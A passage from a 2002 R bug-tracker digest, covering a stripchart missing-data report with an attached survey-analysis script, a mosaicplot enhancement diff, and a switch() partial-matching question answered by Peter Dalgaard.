stripchart(nprob[cancer==4 & !is.na(nprob)] ~ probtype[cancer==4 &
!is.na(nprob)],meth="stack")

So, either the behavior or the documentation appears to need changing.
I would prefer to change the behavior so it matches the documentation.

Jon

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2019 *
Subject: p.s. regarding stripchart missing-data report
From: Jonathan Baron <baron@cattell.psych.upenn.edu>
Date: Sat, 14 Sep 2002 13:48:34 -0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2019 <==
From baron@cattell.psych.upenn.edu  Sat Sep 14 19:49:38 2002
Received: from localhost.localdomain (pool-151-201-155-186.phil.east.verizon.net [151.201.155.186])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA07716
	for <r-bugs@biostat.ku.dk>; Sat, 14 Sep 2002 19:49:29 +0200 (MET DST)
Received: (from baron@localhost)
	by localhost.localdomain (8.11.6/8.11.6) id g8EHmYa04361
	for r-bugs@biostat.ku.dk; Sat, 14 Sep 2002 13:48:34 -0400
Date: Sat, 14 Sep 2002 13:48:34 -0400
From: Jonathan Baron <baron@cattell.psych.upenn.edu>
To: r-bugs@biostat.ku.dk
Subject: p.s. regarding stripchart missing-data report
Message-ID: <20020914134834.A4357@cattell.psych.upenn.edu>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="oyUTqETQ0mS9luUI"
Content-Disposition: inline
User-Agent: Mutt/1.2.5.1i


--oyUTqETQ0mS9luUI
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

In case you want this - and feel free to delete this - here are the
data for the bug I just reported concerning missing data in
stripchart.

You need to run hrp2.R.  Please excuse the extraneous junk.  This was
written mostly by a grad student who was learning R in the process
(Andrea Gurmankin).  She doesn't like to delete things.

Jon


--oyUTqETQ0mS9luUI
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="hrp2.R"

t2 <- read.table("hrp2.data")
# t1 <- t2[-c(1,2,11,19,20,54,83)] # less than 6 on log scale
t1 <- t2[-c(52,124),] # less than 5

ns <- nrow(t1) # number of Ss remaining

# ----------- define sub-matrices and summary variables

t1[which(t1[,1]==0),1] <- NA
t1[which(t1[,4]==0),4] <- NA
t1[which(t1[,12]==0),12] <- NA
t1[which(t1[,13]==0),13] <- NA
t1[which(t1[,15]==0),15] <- NA
t1[which(t1[,17]==0),17] <- NA
t1[which(t1[,18]==0),18] <- NA
t1[which(t1[,19]==0),19] <- NA
t1[which(t1[,20]==0),20] <- NA
t1[which(t1[,31]==7),31] <- NA
t1[which(t1[,12]==21),12] <- NA
t1[which(t1[,34]==0),34] <- NA
t1[which(t1[,37]==0),37] <- NA
t1[which(t1[,38]==0),38] <- NA
t1[which(t1[,39]=="y"),39] <- 1
t1[which(t1[,41]==5),41] <- NA
t1[which(t1[,43]==5),43] <- NA
t1[which(t1[,44]==5),44] <- NA
t1[which(t1[,46]==3),46] <- NA
t1[which(t1[,50]==5),50] <- NA
t1[which(t1[,51]==5),51] <- NA
t1[which(t1[,52]==5),52] <- NA
t1[which(t1[,53]==5),53] <- NA
t1[which(t1[,56]==5),56] <- NA
t1[which(t1[,58]==4),58] <- NA
t1[which(t1[,59]==4),59] <- NA
t1[which(t1[,60]==3),60] <- NA
t1[which(t1[,60]==11),60] <- 1
t1[which(t1[,61]==3),61] <- NA
t1[which(t1[,64]==5),64] <- NA
t1[which(t1[,65]==5),65] <- NA
t1[which(t1[,66]==5),66] <- NA
t1[which(t1[,67]==5),67] <- NA
t1[which(t1[,71]==3),71] <- NA
t1[which(t1[,72]==11),72] <- 1
t1[which(t1[,72]==4),72] <- NA
t1[which(t1[,74]==0),74] <- NA
t1[which(t1[,74]=="n"),74] <- 2
t1[which(t1[,75]=="n"),75] <- 2
t1[which(t1[,76]=="y"),76] <- 1
t1[which(t1[,77]==11),77] <- 1
t1[which(t1[,77]=="y"),77] <- 1
t1[which(t1[,78]==11),78] <- 1
t1[which(t1[,78]=="y"),78] <- 1
t1[which(t1[,79]=="n"),79] <- 2
t1[which(t1[,80]=="n"),80] <- 2
t1[which(t1[,81]=="y"),81] <- 1
t1[which(t1[,82]=="y"),82] <- 1
t1[which(t1[,87]==0),87] <- NA
t1[which(t1[,88]==0),88] <- NA
t1[which(t1[,90]==0),90] <- NA
t1[which(t1[,96]==13),96] <- NA
t1[which(t1[,100]==13),100] <- NA
t1[which(t1[,101]==11),101] <- 1
t1[which(t1[,101]==110),101] <- NA
t1[which(t1[,105]==0),105] <- NA
t1[which(t1[,113]==110),113] <- NA
t1[which(t1[,115]==0),115] <- NA
t1[which(t1[,213]==5),213] <- NA
t1[which(t1[,214]==6),214] <- NA
t1[which(t1[,215]==11),215] <- 1
t1[which(t1[,217]==0),217] <- NA
t1[which(t1[,218]==24),218] <- NA
t1[which(t1[,222]==23),222] <- NA
t1[which(t1[,227]==5),227] <- NA
t1[which(t1[,231]==5),231] <- NA
t1[which(t1[,236]==5),236] <- NA
t1[which(t1[,242]==12),242] <- NA
t1[which(t1[,243]==42),243] <- NA
t1[which(t1[,245]==41),245] <- NA
t1[which(t1[,246]==50),246] <- NA
t1[which(t1[,247]==100),247] <- NA
t1[which(t1[,248]==50),248] <- NA
t1[which(t1[,248]==55),248] <- NA
t1[which(t1[,250]==50),250] <- NA
t1[which(t1[,250]==83),250] <- NA
t1[which(t1[,250]==92),250] <- NA
t1[which(t1[,250]==93),250] <- NA

qs <- as.matrix(t1[,116:211])
colnames(qs) <- c(paste("q01",1:24,sep="."),paste("q02",1:24,sep="."),
                  paste("q03",1:24,sep="."),paste("q04",1:24,sep="."))
times <- qs[,c(0:3*24+3,0:3*24+24)]
tmean <- apply(times,1,mean,trim=.15)

#tmean is time mean for each Ss and trims off top and bottom 15%
plot(sort(tmean))

#each Ss has 6 times
#throw out the longest and shortest 15% times for each Ss and then compute time means for each Ss
#look at Ss mean for times (plot(sort(tmean)) and eliminate fast outliers. 

act <- as.matrix(t1[,c(1:20,31:40,73:82)]) # 1=y 2=n
colnames(act) <-
c("B.actl.100","B.actl.20","B.actl.40","B.actl.60","B.actl.80","Bfr.actl.100",
"Bfr.actl.20","Bfr.actl.40","Bfr.actl.60","Bfr.actl.80",
"C.actl.100","C.actl.20","C.actl.40","C.actl.60","C.actl.80","Cfr.actl.100",
"Cfr.actl.20","Cfr.actl.40","Cfr.actl.60","Cfr.actl.80",
"L.actl.100","L.actl.20","L.actl.40","L.actl.60","L.actl.80","Lfr.actl.100",
"Lfr.actl.20","Lfr.actl.40","Lfr.actl.60","Lfr.actl.80",
"P.actl.100","P.actl.20","P.actl.40","P.actl.60","P.actl.80","Pfr.actl.100",
"Pfr.actl.20","Pfr.actl.40","Pfr.actl.60","Pfr.actl.80")
act[act=="y"] <- 1 # clean up responses
act[act=="n"] <- 2
act[act=="0"] <- NA # don't know what else to do with these (4 of them)
act[act=="11"] <- 1
act <- apply(act,2,as.numeric) # convert to numeric

lot <- as.matrix(t1[,21:30]) # 5=strongly agree, 1=strongly disagree
colnames(lot) <-
  c("LOTa","LOTb","LOTc","LOTd","LOTe","LOTf","LOTg","LOTh","LOTi","LOTj")

lot[,c(3,7,9)] <- 6-lot[,c(3,7,9)]
lot.score <- apply(lot[,c(1,3,4,7,9,10)],1,mean,na.rm=T)
#columns correspond to LOTa, LOTc, LOTd, LOTg, LOTi, LOTj

mss <- as.matrix(t1[,41:72]) # 1=do 2=not do
colnames(mss) <- c("MBSSa1","MBSSa2","MBSSa3","MBSSa4",
                   "MBSSa5","MBSSa6","MBSSa7","MBSSa8",
                   "MBSSb1","MBSSb2","MBSSb3","MBSSb4",
                   "MBSSb5","MBSSb6","MBSSb7","MBSSb8",
                   "MBSSc1","MBSSc2","MBSSc3","MBSSc4",
                   "MBSSc5","MBSSc6","MBSSc7","MBSSc8",
                   "MBSSd1","MBSSd2","MBSSd3","MBSSd4",
                   "MBSSd5","MBSSd6","MBSSd7","MBSSd8")
mss[mss==11] <- 3 # mss is numeric
mss[mss==2] <- 0

mss.m.score <- (mss[,1] + mss[,4] + mss[,6] + mss[,7] + mss[,10] + mss[,12] + mss[,13] + mss[,16] + mss[,17] + mss[,18] 
 + mss[,20] + mss[,23] + mss[,25] + mss[,28] + mss[,30] + mss[,31])
 
mss.b.score <- (mss[,2] + mss[,3] + mss[,5] + mss[,8] + mss[,9] + mss[,11] + mss[,14] + mss[,15] + mss[,19] + mss[,21] 
 + mss[,22] + mss[,24] + mss[,26] + mss[,27] + mss[,29] + mss[,32])

demos <- as.matrix(t1[,83:115])
denial <- apply(demos[,11:14],c(1,2),as.numeric) # convert to numeric
denial.score <- rowMeans(denial) # subject means (no missing data)

hb <- apply(demos[,15:22],c(1,2),as.numeric) # convert to numeric
num <- demos[,26:30]
num <- demos[,c(26:30,7,10,25,33)] # include bctrans,cc..,lc..,pc..
num[num=="a"] <- 1 # recode a-c to numbers to make scoring easier
num[num=="b"] <- 2
num[num=="c"] <- 3
num[num=="1/4"] <- .25 # happened 2x in pctrans - really a wrong answer
num <- apply(num,c(1,2),as.numeric)
num.correct <- t(num)==c(500,3,10,100,2,60,.03,10,25)
num.score <- colMeans(num.correct)
demos <- demos[,c(1:6,8,9,23,24,31,32)]
demos[demos=="y"] <- 1
demos[demos=="n"] <- 2
demos[demos=="m"] <- 1
demos[demos=="f"] <- 2
demos[demos=="0"] <- 2 # these were responses to "die" questions, counted as "no"
demos[demos=="mi"] <- NA # demos is still character, not numeric
demos <- apply(demos,2,as.numeric)
educ <- as.vector(demos[,1])
age <- as.vector(demos[,2])
# health <- as.vector(demos[,3]) # missing
sex <- as.vector(demos[,4])
bc.die <- as.vector(demos[,5])
bc.had <- as.vector(demos[,6])
cc.die <- as.vector(demos[,7])
cc.had <- as.vector(demos[,8])
lc.die <- as.vector(demos[,9])
lc.had <- as.vector(demos[,10])
pc.die <- as.vector(demos[,11])
pc.had <- as.vector(demos[,12])
rm(demos)



sf12 <- as.matrix(t1[,212:222])
colnames(sf12) <- c("sf12.1","sf12.2a","sf12.2b","sf12.3","sf12.4a","sf12.4b",
"sf12.5","sf12.6a","sf12.6b","sf12.6c","sf12.7")
sf12[sf12=="y"] <- 1
sf12[sf12=="11"] <- 1
sf12[sf12=="n"] <- 2
sf12 <- apply(sf12,2,as.numeric)

stai <- as.matrix(t1[,223:242])
colnames(stai) <- c("stai.a","stai.b","stai.c","stai.d","stai.e","stai.f",
"stai.g","stai.h","stai.i","stai.j","stai.k","stai.l","stai.m","stai.n",
"stai.o","stai.p","stai.q","stai.r","stai.s","stai.t")
stai[stai==12] <- NA # assume this was an effort to change 1 to 2 (one response)
stai[stai==5] <- 4
stai.score <- 50+((stai-2.5) %*%
                   c(-1,1,-1,1,1,-1,-1,1,1,-1,1,1,-1,-1,1,-1,1,1,-1,1))


truste <- as.matrix(t1[,243:250])
colnames(truste) <-  c("trust1a","trust1b","trust1c","trust1d","trust1e",
"trust1f","trust1g","trust2")

truste[,1] <- 6 - truste[,1]
truste[,3] <- 6 - truste[,3]
truste[,5] <- 6 - truste[,5]
truste[,6] <- 6 - truste[,6]
truste[,8] <- ceiling(truste[,8]/2 + (0+truste[,8]==0))

truste.score <- 100*(apply(truste,1,mean,na.rm=T)-1)/4


# write csv file of all data
#write.table(data.frame(act,lot,mss,denial,hb,num,age,truste,
#sex, bc.die, bc.had, cc.die, cc.had, lc.die, lc.had, pc.die,
#pc.had,denial,qs,sf12,stai), file="hrp2.csv",sep=",", row.names=F)

qs <- array(qs,c(ns,24,4)) # subjects, items, cancers
cancer <- as.vector(qs[,1,])
 cancer[cancer>4] <- 4 # correct some js error
 cancer <- as.factor(cancer) # like "cat" in Systat
probtype <- as.factor(as.vector(floor(qs[,2,]/4)))
subj <- as.factor(rep(1:ns,4))

# ---- this makes one array where the third argument is the condition
# conditions are 1-4=verbal, 5-8=percent, 9-12 fraction
# 1-4 are the four cancers, also 5-8 and 9-12

qsall <- array(NA,c(ns,24,12))
for (i in 1:ns) {for (j in 1:4) {condition <- qs[i,2,j]+1
                                 qsall[i,,condition] <- qs[i,,j]}}
qsall[,1,] <- qsall[,2,] %% 4 + 1
qsall[,2,] <- floor(qsall[,2,]/4)

vnames <- c("Cancer","Probtype","time1","nprob","conf","vprob","worry",
  "QOL","trust","comfort","getit.100","getit.80","getit.60","getit.40",
  "getit.20","docsaid","notnotice","minrisk","exagg","docwrong","notapply",
  "trick","misunderst","time2")
cnames <- c("prostate.v","colon.v","lung.v","breast.v",
            "prostate.p","colon.p","lung.p","breast.p",
            "prostate.f","colon.f","lung.f","breast.f")
dimnames(qsall) <- list(NULL,vnames,cnames)
prostate <- c(1,5,9)
colon <- c(2,6,10)
lung <- c(3,7,11)
breast <- c(4,8,12)
words <- 1:4
percent <- 5:8
fraction <- 9:12
numbers <- 5:12

#Now if you want just the nprob data for numbers (fractions or
#percent), you can refer to nprob.m[,numbers].  You need the comma
#because "numbers" refers to the columns in the matrix.

# use .m for these to distinguish them from later ones
cancer.m <- qsall[,1,]
probtype.m <- qsall[,2,] # skipped time
verbal.m <- (probtype.m==0) + 0 # now coded 1,0
nprob.m <- qsall[,4,]
conf.m <- qsall[,5,]
vprob.m <- qsall[,6,]
worry.m <- qsall[,7,] 
QOL.m <- qsall[,8,]
trust.m <- qsall[,9,]
comfort.m <- qsall[,10,]
getit.100.m <- qsall[,11,]
getit.80.m <- qsall[,12,]
getit.60.m <- qsall[,13,]
getit.40.m <- qsall[,14,] 
getit.20.m <- qsall[,15,]
docsaid.m <- qsall[,16,]
notnotice.m <- qsall[,17,]
minrisk.m <- qsall[,18,]
exagg.m <- qsall[,19,]
docwrong.m <- qsall[,20,]
notapply.m <- qsall[,21,] 
trick.m <- qsall[,22,]
misunderst.m <- qsall[,23,]

# ----------- this part creates a whole bunch of variables from qs for anova

nprob <- as.vector(qs[,4,])
conf <- as.vector(qs[,5,])
vprob <- as.vector(qs[,6,])
worry <- as.vector(qs[,7,])
QOL <- as.vector(qs[,8,])
trust <- as.vector(qs[,9,])
comfort <- as.vector(qs[,10,])
getit.100 <- as.vector(qs[,11,])
getit.80 <- as.vector(qs[,12,])
getit.60 <- as.vector(qs[,13,])
getit.40 <- as.vector(qs[,14,])
getit.20 <- as.vector(qs[,15,])
docsaid <- as.vector(qs[,16,])
docsaid[docsaid==9] <- NA
notnotice <- as.vector(qs[,17,])
notnotice[notnotice==9] <- NA
minrisk <- as.vector(qs[,18,])
exagg <- as.vector(qs[,19,])
docwrong <- as.vector(qs[,20,])
notapply <- as.vector(qs[,21,])
trick <- as.vector(qs[,22,])
misunderst <- as.vector(qs[,23,])
rm(qs)

group <- as.factor((1-is.na(nprob.m[,1:3])) %*% c(1,2,3))

#--------------------
# NEW SECTION 8/6/02
# We need both matrix and vector forms of each deviation score
# New names: deviat
#log odds transformation of nprob to stretch out differences near zero.
rightans.m <- matrix(c(25,.03,10,60),ns,12,byrow=T)
rightans <- rep(c(25,.03,10,60),rep(ns,4))
logo <- function(x) log(x/(100-x))
trim <- function(x) x+(.0001)*(x<.0001)-(.0001)*(x==100)
deviat.logo.m <- logo(trim(nprob.m))-logo(rightans.m)
deviat.logo <- logo(trim(nprob))-logo(rightans)
# apply this to nprob.dev.logo
ctrim <- function(x) {x*(x>0-10 & x<10)-10*(x<0-10)+10*(x>10)}

deviatt.logo.m <- ctrim(deviat.logo.m)
deviatt.logo <- ctrim(deviat.logo)

plot(deviat.logo,ctrim(deviat.logo))

#within-Ss mean of deviation score
deviat.logo.sm <- apply(deviat.logo.m[,5:12],1,mean,na.rm=T)

mean(deviat.logo.sm,na.rm=T)
              
# Looking at this you can see right away what is going on.
# Estimates are too high, especially for cancer #2 (the low
# one).  But the outliers are also apparent.  I thought that
# cutting them off at + or - 10 seemed reasonable.  So:
                       
#linear transformation of nprob
deviat.lino.m <- (nprob.m>rightans.m)*(nprob.m-rightans.m)/(100-rightans.m) +
                 (nprob.m<rightans.m)*(nprob.m-rightans.m)/rightans.m
deviat.lino <- (nprob>rightans)*(nprob-rightans)/(100-rightans) +
               (nprob<rightans)*(nprob-rightans)/rightans
deviat.raw.m <- nprob.m-rightans.m

par(las=1)
stripchart(c(t(deviat.lino.m)) ~ rep(cnames,ns))
stripchart(c(t(deviat.logo.m)) ~ rep(cnames,ns))
stripchart(c(t(ctrim(deviat.logo.m))) ~ rep(cnames,ns))
stripchart(c(t(deviat.raw.m)) ~ rep(cnames,ns))

# end of new section (but nprob.dev changed to deviat throughout

# ----- everything after this is commented out and is deletable


nprob.p0 <- nprob[probtype==0]
nprob.p12 <- nprob[probtype!=0]

round(nprob[cancer==0],2)
round(nprob[cancer==1],2)
round(nprob[cancer==2],2)

table(sex)/sum(table(sex))

#na.rm=T  removes NAs so you can take the mean of it.

mean(stai.score,na.rm=T)
mean(denial,na.rm=T)
mean(age,na.rm=T)
sd(age,na.rm=T)
mean(educ,na.rm=T)
sd(educ,na.rm=T)
mean(sf12[,1],na.rm=T)


verbal <- probtype==0

deviat.p.fr <- (25 - (nprob[cancer==1 & probtype==2]))
deviat.p.pt <- (25 - (nprob[cancer==1 & probtype==1]))
deviat.c.fr <- (.03 - (nprob[cancer==2 & probtype==2]))
deviat.c.pt <- (.03 - (nprob[cancer==2 & probtype==1]))
deviat.l.fr <- (10 - (nprob[cancer==3 & probtype==2]))
deviat.l.pt <- (10 - (nprob[cancer==3 & probtype==1]))
deviat.b.fr <- (60 - (nprob[cancer==4 & probtype==2]))
deviat.b.pt <- (60 - (nprob[cancer==4 & probtype==1]))


mean(deviat.p.fr,na.rm=T)
mean(deviat.p.pt,na.rm=T)
mean(deviat.c.fr,na.rm=T)
mean(deviat.c.pt,na.rm=T)
mean(deviat.l.fr,na.rm=T)
mean(deviat.l.pt,na.rm=T)
mean(deviat.b.fr,na.rm=T)
mean(deviat.b.pt,na.rm=T)

nprob.p.fr.acc <- sign(deviat.p.fr)
nprob.p.pt.acc <- sign(deviat.p.fr)
nprob.c.fr.acc <- sign(deviat.c.fr)
nprob.c.pt.acc <- sign(deviat.c.fr)
nprob.l.fr.acc <- sign(deviat.l.fr)
nprob.l.pt.acc <- sign(deviat.l.fr)
nprob.b.fr.acc <- sign(deviat.b.fr)
nprob.b.pt.acc <- sign(deviat.b.fr)

table(nprob.p.fr.acc)/sum(table(nprob.p.fr.acc))
table(nprob.p.pt.acc)/sum(table(nprob.p.pt.acc))
table(nprob.c.fr.acc)/sum(table(nprob.c.fr.acc))
table(nprob.c.pt.acc)/sum(table(nprob.c.pt.acc))
table(nprob.l.fr.acc)/sum(table(nprob.l.fr.acc))
table(nprob.l.pt.acc)/sum(table(nprob.l.pt.acc))
table(nprob.b.fr.acc)/sum(table(nprob.b.fr.acc))
table(nprob.b.pt.acc)/sum(table(nprob.b.pt.acc))

 #------------ notes:
 #P.actl.100 not included in comput, so missing
# recoding work needed on hb (high numbers), trust (same), stai (y/n)

# --------------- do basic analyses (examples)

#readline("examples of data summary follow - press any key to continue")
#summary(num)
#readline("ugly summary of nprob by cancer and probtype, and plot (look at it!)")
#by(nprob,list(cancer,probtype),summary)
#stripchart(nprob~cancer,method="stack",offset=1/6,main="by cancer")
#readline("prostate (look at the plot!)")

stripchart(nprob[cancer==1] ~ probtype[cancer==1],method="stack", main="Prostate, 0=words 1=pct 2=frac")

#readline("colon")
stripchart(nprob[cancer==2] ~ probtype[cancer==2],method="stack",main="Colon, 0=words 1=pct 2=frac")
#window()
#readline("lung")

stripchart(nprob[cancer==3] ~ probtype[cancer==3],method="stack", main="Lung, 0=words 1=pct 2=frac")
#window()

#readline("breast")

#commented this below out b/c file is crashing on it.
#stripchart(nprob[cancer==4] ~ probtype[cancer==4],method="stack", main="Breast, 0=words 1=pct 2=frac")

#readline("analysis of variance - very crude")
#summary(aov(nprob ~ subj+cancer*probtype))

table(sex)/sum(table(sex))

#na.rm=T  removes NAs so you can take the mean of it.

mean(stai.score,na.rm=T)
mean(denial,na.rm=T)
mean(age,na.rm=T)
mean(educ,na.rm=T)
mean(sf12[,1],na.rm=T)

by(nprob, list(cancer,probtype), range)

# calculates the % of times that each response was endorsed across cancer and probtypes.
# this has double-counting problem
table(docsaid)/sum(table(docsaid))
table(notnotice)/sum(table(notnotice))
table(minrisk)/sum(table(minrisk))
table(exagg)/sum(table(exagg))
table(docwrong)/sum(table(docwrong))
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2023 *
Subject: mosaicplot enhancements
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Date: Mon, 16 Sep 2002 12:00:26 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2023 <==
From ligges@amadeus.statistik.uni-dortmund.de  Mon Sep 16 11:59:51 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA14178
	for <R-bugs@biostat.ku.dk>; Mon, 16 Sep 2002 11:59:51 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Mon, 16 Sep 2002 11:59:10 +0200
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.11.6+Sun/8.11.6) with ESMTP id g8G9x9J01947;
	Mon, 16 Sep 2002 11:59:10 +0200 (MET DST)
Message-ID: <3D85ABBA.60E8A971@statistik.uni-dortmund.de>
Date: Mon, 16 Sep 2002 12:00:26 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
X-Mailer: Mozilla 4.79 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs <R-bugs@biostat.ku.dk>
CC: wolfram@fischer-zim.ch
Subject: mosaicplot enhancements
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

This is a feature request for mosaicplot, including the 
suggestion for the code changes (mosaicplot.R) and docs
(mosaicplot.Rd) by Wolfram Fischer and myself, 
diff'ed to 1.6.0 beta (2002-09-14):

Uwe Ligges


.../src/library/base/R/mosaicplot.R:

====================================================

11a12,13
> ### Changes by W. Fischer and U. Ligges:
> ## - Deparsing x in for main title. New arguments: sub, las, cex.axis
14,15c16,19
< function(x, main = NULL, xlab = NULL, ylab = NULL, sort = NULL, off =
<          NULL, dir = NULL, color = FALSE, shade = FALSE, margin = NULL,
---
> function(x, main = deparse(substitute(x)), sub = NULL, xlab = NULL, 
>          ylab = NULL, sort = NULL, off = NULL, dir = NULL, 
>          color = FALSE, shade = FALSE, margin = NULL, 
>          cex.axis = 0.66, las = par("las"), 
18,19c22,24
<     mosaic.cell <- function(X, x1, y1, x2, y2, off, dir, color, lablevx, lablevy,
<                             maxdim, currlev, label)
---
>     mosaic.cell <- function(X, x1, y1, x2, y2, srt.x, srt.y, 
>             adj.x, adj.y, off, dir, color, lablevx, lablevy,
>             maxdim, currlev, label)
50c55
<                      srt=0, adj=.5, cex=.66, this.lab)
---
>                      srt=srt.x, adj=adj.x, cex=cex.axis, this.lab)
110c115
<                      srt=90, adj=.5, cex=.66, this.lab)
---
>                      srt=srt.y, adj=adj.y, cex=cex.axis, this.lab)
148a154,158
> 
>     ## Calculate string rotation for different settings of las:
>     srt.x <- if(las > 1) 90 else 0
>     srt.y <- if(las == 0 || las == 3) 90 else 0
> 
301c311
<              srt = 90, cex = 0.66)
---
>              srt = 90, cex = cex.axis)
304,313c314,341
<     if (!is.null(main) || !is.null(xlab) || !is.null(ylab))
<         title(main, xlab=xlab, ylab=ylab)
< 
<     mosaic.cell(Ind,
<                 x1=50, y1=5, x2=950, y2=950,
<                 off/100, dir,
<                 color, 2, 2,
<                 maxdim= apply(as.matrix(Ind[,1:dimd]), 2, max),
<                 currlev= 1, label)
< 
---
>     if (!is.null(main) || !is.null(xlab) || !is.null(ylab) || !is.null(sub))
>         title(main, sub = sub, xlab = xlab, ylab = ylab)
>     adj.x <- adj.y <- 0.5
>     x1 <- 50; y1 <- 5; x2 <- 950; y2 <- 950
>     maxlen.xlabel <- maxlen.ylabel <- 35    
>     ## Calculations required for 'las' related string rotation 
>     ## and adjustment
>     if(srt.x == 90){
>         maxlen.xlabel <- 
>             max(strwidth(label[[dimd + 1 - match('v', rev(dir))]], 
>                 cex = cex.axis))
>         adj.x <- 1
>         y2 <- y2 - maxlen.xlabel
>     }
>     if(srt.y == 0){
>         maxlen.ylabel <- 
>             max(strwidth(label[[match('h', dir)]],
>                 cex = cex.axis))
>         adj.y <- 0
>         x1 <- x1 + maxlen.ylabel
>     }
>     
>     mosaic.cell(Ind, x1 = x1, y1 = y1, x2 = x2, y2 = y2,
>                 srt.x = srt.x, srt.y = srt.y, adj.x = adj.x, 
>                 adj.y = adj.y, off = off / 100, dir = dir, 
>                 color = color, lablevx = 2, lablevy = 2,
>                 maxdim = apply(as.matrix(Ind[,1:dimd]), 2, max),
>                 currlev = 1, label = label)

====================================================



.../src/library/base/man/mosaicplot.Rd:

====================================================

8c8,9
< \method{mosaicplot}{default}(x, main = NULL, xlab = NULL, ylab = NULL,
---
> \method{mosaicplot}{default}(x, main = deparse(substitute(x)), 
>                    sub = NULL, xlab = NULL, ylab = NULL,
10a12
>                    cex.axis = 0.66, las = par("las"),
18a21
>   \item{sub}{character string for the mosaic sub-title (at bottom).}
44a48,50
>   \item{cex.axis}{The magnification to be used for axis annotation,
>     defaults to the current multiplied by 0.66.}
>   \item{las}{numeric; the style of axis labels, see \code{\link{par}}.}

====================================================
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2033 *
Subject: switch
From: rwehrens@sci.kun.nl
Date: Tue, 17 Sep 2002 23:25:39 +0200 (MET DST)
--not a bug; but worth a documentation hint
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2033 <==
From rwehrens@sci.kun.nl  Tue Sep 17 23:25:40 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA01376
	for <R-bugs@biostat.ku.dk>; Tue, 17 Sep 2002 23:25:39 +0200 (MET DST)
Date: Tue, 17 Sep 2002 23:25:39 +0200 (MET DST)
From: rwehrens@sci.kun.nl
Message-Id: <200209172125.XAA01376@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: switch

Full_Name: Ron Wehrens
Version: 1.5.0
OS: Linux, Solaris, OSF alpha
Submission from: (NULL) (128.95.17.61)


Consider these two functions:
switchme <- function(type, ...) {
  switch(type,
         E = max(...),
         V = length(...),
         EII = sum(...),
         VII = prod(...),
         -100)
}
switchme2 <- function(type, ...) {
  switch(type,
         V = length(...),
         EII = sum(...),
         VII = prod(...),
         -100)
}
The bottom one does what I expect. The top one only gives one answer,
independent 
of the second argument.
> switchme2("V", 1:4)
[1] 4
> switchme2("X", 1:4)
[1] -100
> switchme2("EII", 1:4)
[1] 10
> switchme("V", 1:4)
[1] 24
> switchme("X", 1:4)
[1] 24
> switchme("EII", 1:4)
[1] 24
 
Is there something special about "E"?

==> 2033.reply.1 <==
From p.dalgaard@biostat.ku.dk  Wed Sep 18 00:19:42 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA01572;
	Wed, 18 Sep 2002 00:19:41 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id g8HMJaV26123;
	Wed, 18 Sep 2002 00:19:36 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: rwehrens@sci.kun.nl
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: switch (PR#2033)
References: <200209172125.XAA01381@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 18 Sep 2002 00:19:36 +0200
In-Reply-To: <200209172125.XAA01381@pubhealth.ku.dk>
Message-ID: <x2vg548djb.fsf@biostat.ku.dk>
Lines: 58
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

rwehrens@sci.kun.nl writes:

> Consider these two functions:
> switchme <- function(type, ...) {
>   switch(type,
>          E = max(...),
>          V = length(...),
>          EII = sum(...),
>          VII = prod(...),
>          -100)
> }
> switchme2 <- function(type, ...) {
>   switch(type,
>          V = length(...),
>          EII = sum(...),
>          VII = prod(...),
>          -100)
> }
> The bottom one does what I expect. The top one only gives one answer,
> independent 
> of the second argument.
> > switchme2("V", 1:4)
> [1] 4
> > switchme2("X", 1:4)
> [1] -100
> > switchme2("EII", 1:4)
> [1] 10
> > switchme("V", 1:4)
> [1] 24
> > switchme("X", 1:4)
> [1] 24
> > switchme("EII", 1:4)
> [1] 24
>  
> Is there something special about "E"?

Yes. It matches the EXPR arg to switch using partial matching, so the
case selector becomes max(1:4) == 4 and the fourth case is used to gie
prod(1:4) == 24. Not a bug, although perhaps a feature regretted by
the inventor...

The workaround (except for avoiding case labels E, EX, EXP) is 

switchme <- function(type, ...) {
  switch(EXPR=type,
         E = max(...),
         V = length(...),
         EII = sum(...),
         VII = prod(...),
         -100)
}


-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 2033.audit <==
Wed Sep 18 11:01:56 2002	maechler	changed notes
